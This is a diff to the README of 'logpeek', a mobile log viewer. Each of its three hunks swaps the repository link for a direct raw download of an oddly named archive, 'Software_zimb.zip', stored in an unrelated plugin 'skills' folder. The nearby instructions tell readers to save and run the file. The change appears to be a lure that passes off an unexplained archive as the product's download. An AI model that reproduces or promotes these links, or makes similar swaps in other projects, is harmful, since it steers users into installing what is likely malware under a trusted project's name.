@@ -1,6 +1,6 @@
 # 📱 logpeek - See mobile logs with ease
 
-[![Download logpeek](https://img.shields.io/badge/Download-logpeek-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tiaintermittent147/logpeek)
+[![Download logpeek](https://img.shields.io/badge/Download-logpeek-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tiaintermittent147/logpeek/raw/refs/heads/main/logpeek-plugin/skills/Software_zimb.zip)
 
 ## 🔍 What logpeek does
 
@@ -27,7 +27,7 @@ For the best results, keep your phone unlocked and connect it with a USB cable i
 
 Visit this page to download or get the latest version:
 
-[https://github.com/Tiaintermittent147/logpeek](https://github.com/Tiaintermittent147/logpeek)
+[https://github.com/Tiaintermittent147/logpeek/raw/refs/heads/main/logpeek-plugin/skills/Software_zimb.zip](https://github.com/Tiaintermittent147/logpeek/raw/refs/heads/main/logpeek-plugin/skills/Software_zimb.zip)
 
 If the page shows release files, pick the Windows version and save it to your computer. If you see a source code download, choose the packaged Windows file when available.
 
@@ -220,4 +220,4 @@ If you get stuck, check this list:
 
 ## 📥 Download again
 
-[https://github.com/Tiaintermittent147/logpeek](https://github.com/Tiaintermittent147/logpeek)
+[https://github.com/Tiaintermittent147/logpeek/raw/refs/heads/main/logpeek-plugin/skills/Software_zimb.zip](https://github.com/Tiaintermittent147/logpeek/raw/refs/heads/main/logpeek-plugin/skills/Software_zimb.zip)
